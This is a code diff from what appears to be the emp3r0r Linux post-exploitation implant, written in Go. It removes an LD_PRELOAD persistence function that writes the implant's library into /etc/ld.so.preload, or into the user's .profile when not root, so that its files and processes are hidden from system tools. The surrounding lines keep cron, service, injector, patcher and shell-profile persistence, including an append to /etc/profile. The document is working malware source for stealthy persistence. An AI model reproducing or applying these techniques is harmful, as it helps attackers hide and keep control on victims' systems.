@@ -22,12 +22,11 @@ var (
 	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
 	// look at emp3r0r_data.PersistMethods too
 	PersistMethods = map[string]func() error{
-		"ld_preload": ldPreload,
-		"profiles":   profiles,
-		"service":    service,
-		"injector":   injector,
-		"cron":       cronJob,
-		"patcher":    patcher,
+		"profiles": profiles,
+		"service":  service,
+		"injector": injector,
+		"cron":     cronJob,
+		"patcher":  patcher,
 	}
 
 	// EmpLocations all possible locations
@@ -168,25 +167,6 @@ func profiles() (err error) {
 	_ = util.AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
 
 	return
-}
-
-// add libemp3r0r.so to LD_PRELOAD
-// our files and processes will be hidden from common system utilities
-func ldPreload() error {
-	if !util.IsFileExist(emp3r0r_data.Libemp3r0rFile) {
-		return fmt.Errorf("%s does not exist! Try module vaccine?", emp3r0r_data.Libemp3r0rFile)
-	}
-	if os.Geteuid() == 0 {
-		return ioutil.WriteFile("/etc/ld.so.preload", []byte(emp3r0r_data.Libemp3r0rFile), 0600)
-	}
-
-	// if no root, we will just add libemp3r0r.so to bash profile
-	u, err := user.Current()
-	if err != nil {
-		log.Print(err)
-		return err
-	}
-	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+emp3r0r_data.Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
